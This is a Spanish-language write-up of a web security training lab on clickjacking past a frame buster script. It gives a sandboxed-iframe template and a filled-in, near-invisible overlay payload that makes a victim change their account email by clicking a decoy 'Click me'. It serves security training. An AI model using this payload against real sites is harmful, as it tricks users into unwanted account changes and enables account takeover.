# (x)Lab: Clickjacking with a frame buster script

```jsx
This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter
```

Una solución eficaz para los atacantes contra los eliminadores de marcos es utilizar el iframe con el atributo `sandbox` de HTML5. Cuando se configura con los valores `allow-forms`o `allow-scripts`  y `allow-top-navigation` no se encuentra definido, el script del eliminador de marcos puede neutralizarse, ya que el iframe no puede comprobar si es o no la ventana superior:

```jsx
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>

```

En base a estos conceptos, vamos a usar esta plantilla

```jsx
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>

```

Adaptemoslo al ejericio anterior

```jsx
<style>
    iframe {
        position:relative;
				width: 700px;
        height: 700px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:75px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://0ac70058030a1a3182d389af00c000bf.web-security-academy.net/my-account?email=delhacker@attacker-website.com"></iframe>
```

![image.png]((x)Lab%20Clickjacking%20with%20a%20frame%20buster%20script%20c8287080b66444f5b86132a758815594/image.png)